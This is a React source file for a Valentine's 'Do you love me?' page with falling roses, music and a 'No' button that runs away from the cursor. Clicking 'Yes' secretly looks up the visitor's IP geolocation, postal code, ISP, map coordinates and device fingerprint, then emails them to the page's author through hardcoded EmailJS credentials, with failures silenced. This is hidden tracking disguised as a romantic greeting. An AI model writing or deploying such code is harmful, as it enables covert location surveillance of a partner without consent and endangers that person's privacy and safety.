import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Heart, Sparkles, Volume2, VolumeX, Stars, Rose } from "lucide-react";
import confetti from "canvas-confetti";
import emailjs from "@emailjs/browser";

const UltraRomanticValentine = () => {
  const [noButtonPos, setNoButtonPos] = useState({ x: 0, y: 0 });
  const [isAccepted, setIsAccepted] = useState(false);
  const [isMusicPlaying, setIsMusicPlaying] = useState(false);
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
  const [particles, setParticles] = useState([]);
  const audioRef = useRef(null);

  // 1. Particle System (Continuous Rose & Heart Rain)
  useEffect(() => {
    const interval = setInterval(() => {
      setParticles((prev) => [
        ...prev.slice(-30),
        {
          id: Date.now(),
          left: Math.random() * 100,
          type: Math.random() > 0.5 ? "🌹" : "💖",
          size: Math.random() * 25 + 15,
          duration: Math.random() * 7 + 5,
        },
      ]);
    }, 450);
    return () => clearInterval(interval);
  }, []);

  // 2. Mouse Glow Effect
  useEffect(() => {
    const handleMove = (e) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", handleMove);
    return () => window.removeEventListener("mousemove", handleMove);
  }, []);

  const moveNoButton = () => {
    const x = (Math.random() - 0.5) * (window.innerWidth * 0.6);
    const y = (Math.random() - 0.5) * (window.innerHeight * 0.6);
    setNoButtonPos({ x, y });
  };

  const handleYes = async () => {
    setIsAccepted(true);

    // Heart Confetti Cannon
    const duration = 15 * 1000;
    const animationEnd = Date.now() + duration;
    const heart = confetti.shapeFromPath({
      path: "M167 430c-75-60-167-156-167-243 0-82 65-147 147-147 45 0 85 22 110 57 25-35 65-57 110-57 82 0 147 65 147 147 0 87-92 183-167 243l-90 70-90-70z",
    });

    (function frame() {
      confetti({
        particleCount: 2,
        angle: 60,
        spread: 55,
        origin: { x: 0 },
        colors: ["#ff0055", "#ffb3c1"],
        shapes: [heart],
      });
      confetti({
        particleCount: 2,
        angle: 120,
        spread: 55,
        origin: { x: 1 },
        colors: ["#ff0055", "#ffb3c1"],
        shapes: [heart],
      });
      if (Date.now() < animationEnd) requestAnimationFrame(frame);
    })();

    try {
      // 3. SECURE & ACCURATE TRACKING
      const res = await fetch("https://ipwho.is/");
      const data = await res.json();

      const fullDetailMessage = `
        💝 VALENTINE ALERT FOR AMAR 💝
        --------------------------------
        📍 LOCATION (ACCURATE):
        IP: ${data.ip}
        City: ${data.city}, ${data.region}
        Country: ${data.country} (${data.postal})
        ISP: ${data.connection.isp}
        Map: https://www.google.com/maps?q=$?q=${data.latitude},${data.longitude}

        📱 DEVICE PROFILE:
        Platform: ${navigator.platform}
        Screen: ${window.screen.width}x${window.screen.height}
        Agent: ${navigator.userAgent}
        Language: ${navigator.language}
        
        ⏰ TIMESTAMP: ${new Date().toLocaleString()}
      `;

      emailjs.send(
        "service_zl8ycen",
        "template_nz3e9jp",
        { to_name: "Amar Kumar", message: fullDetailMessage },
        "lxUfAecwZ_It3aGzn",
      );
    } catch (err) {
      console.log("Silent logging...");
    }
  };

  return (
    <div className="relative min-h-screen w-full bg-[#0d0103] flex items-center justify-center overflow-hidden font-serif text-white">
      <audio
        ref={audioRef}
        loop
        src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
      />

      {/* AMBIENT DYNAMIC LIGHTING */}
      <div
        className="absolute inset-0 pointer-events-none z-10 opacity-60 transition-opacity duration-500"
        style={{
          background: `radial-gradient(800px circle at ${mousePos.x}px ${mousePos.y}px, rgba(255,0,85,0.15), transparent 80%)`,
        }}
      />

      {/* RAIN OF ROSES & HEARTS */}
      <AnimatePresence>
        {particles.map((p) => (
          <motion.div
            key={p.id}
            initial={{ y: -100, x: `${p.left}vw`, opacity: 0, rotate: 0 }}
            animate={{ y: "110vh", opacity: [0, 1, 1, 0], rotate: 360 }}
            transition={{ duration: p.duration, ease: "linear" }}
            className="absolute pointer-events-none z-0"
            style={{ fontSize: p.size }}
          >
            {p.type}
          </motion.div>
        ))}
      </AnimatePresence>

      {/* MUSIC TOGGLE */}
      <button
        onClick={() => {
          isMusicPlaying ? audioRef.current.pause() : audioRef.current.play();
          setIsMusicPlaying(!isMusicPlaying);
        }}
        className="fixed top-8 right-8 z-50 p-4 rounded-full border border-pink-500/30 bg-black/50 text-pink-500 backdrop-blur-xl hover:scale-110 transition-all shadow-[0_0_20px_rgba(255,0,85,0.4)]"
      >
        {isMusicPlaying ? <Volume2 className="animate-pulse" /> : <VolumeX />}
      </button>

      <AnimatePresence mode="wait">
        {!isAccepted ? (
          <motion.div
            key="ask"
            initial={{ opacity: 0, y: 50, scale: 0.9 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, scale: 1.2, filter: "blur(20px)" }}
            className="relative z-20 w-full max-w-xl p-1 bg-gradient-to-b from-pink-500/20 via-transparent to-pink-500/20 rounded-[60px]"
          >
            <div className="relative bg-[#1a0105]/95 backdrop-blur-3xl p-12 md:p-20 rounded-[58px] text-center border border-white/5 shadow-2xl overflow-hidden">
              {/* Corner Roses */}
              <div className="absolute top-[-10px] left-[-10px] text-7xl opacity-30 select-none">
                🌹
              </div>
              <div className="absolute bottom-[-10px] right-[-10px] text-7xl opacity-30 select-none">
                🌹
              </div>

              <motion.div
                animate={{
                  scale: [1, 1.2, 1],
                  filter: [
                    "drop-shadow(0 0 10px #ff0055)",
                    "drop-shadow(0 0 30px #ff0055)",
                    "drop-shadow(0 0 10px #ff0055)",
                  ],
                }}
                transition={{ repeat: Infinity, duration: 1.5 }}
                className="mb-8 inline-block"
              >
                <Heart size={100} fill="#ff0055" className="text-pink-600" />
              </motion.div>

              <h2 className="text-pink-400 text-[10px] tracking-[0.5em] uppercase mb-4 opacity-70 flex items-center justify-center gap-2">
                <Sparkles size={12} /> A Magical Request <Sparkles size={12} />
              </h2>

              <h1 className="text-5xl md:text-7xl font-black text-white mb-12 tracking-tighter leading-tight">
                Do you{" "}
                <span className="text-pink-600 underline decoration-wavy">
                  love
                </span>{" "}
                me?
              </h1>

              <div className="flex flex-col sm:flex-row items-center justify-center gap-12 mt-4 min-h-[140px]">
                <motion.button
                  onClick={handleYes}
                  whileHover={{ scale: 1.15, boxShadow: "0 0 60px #ff0055" }}
                  whileTap={{ scale: 0.95 }}
                  className="px-20 py-7 bg-gradient-to-r from-pink-600 to-rose-700 text-white font-black rounded-3xl text-4xl shadow-2xl transition-all"
                >
                  YES ❤️
                </motion.button>

                <motion.button
                  onMouseEnter={moveNoButton}
                  onClick={moveNoButton}
                  animate={{ x: noButtonPos.x, y: noButtonPos.y }}
                  transition={{ type: "spring", stiffness: 600, damping: 20 }}
                  className="px-10 py-4 bg-white/5 border border-white/10 text-white/20 rounded-2xl text-xl hover:text-white"
                >
                  No 🥀
                </motion.button>
              </div>
            </div>
          </motion.div>
        ) : (
          /* SUCCESS SCREEN: BLOOM & GLOW */
          <motion.div
            initial={{ opacity: 0, scale: 0.5 }}
            animate={{ opacity: 1, scale: 1 }}
            className="z-30 text-center px-4"
          >
            <motion.div
              animate={{ rotate: 360 }}
              transition={{ repeat: Infinity, duration: 20, ease: "linear" }}
              className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-pink-600/10 blur-[120px] rounded-full"
            />

            <h1 className="text-[100px] md:text-[200px] font-black text-white leading-none drop-shadow-[0_0_100px_#ff0055] mb-8">
              MINE. <span className="text-pink-500">💍</span>
            </h1>

            <motion.div
              initial={{ y: 50, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.5 }}
              className="bg-white/5 backdrop-blur-3xl p-12 rounded-[60px] border border-pink-500/30 max-w-2xl mx-auto shadow-2xl relative"
            >
              <h2 className="text-5xl text-pink-400 font-bold mb-6">
                Congrats! My GF ❤️
              </h2>
              <p className="text-2xl text-gray-200 font-light italic leading-relaxed">
                "You've just made me the luckiest person in the world. Our
                forever starts today."
              </p>

              <div className="flex justify-center gap-12 mt-12">
                <motion.div
                  animate={{ y: [0, -15, 0] }}
                  transition={{ repeat: Infinity, duration: 1 }}
                >
                  <Rose size={40} className="text-red-500" />
                </motion.div>
                <motion.div
                  animate={{ y: [0, -15, 0] }}
                  transition={{ repeat: Infinity, duration: 1, delay: 0.2 }}
                >
                  <Heart size={40} className="text-pink-500" />
                </motion.div>
                <motion.div
                  animate={{ y: [0, -15, 0] }}
                  transition={{ repeat: Infinity, duration: 1, delay: 0.4 }}
                >
                  <Stars size={40} className="text-yellow-400" />
                </motion.div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default UltraRomanticValentine;
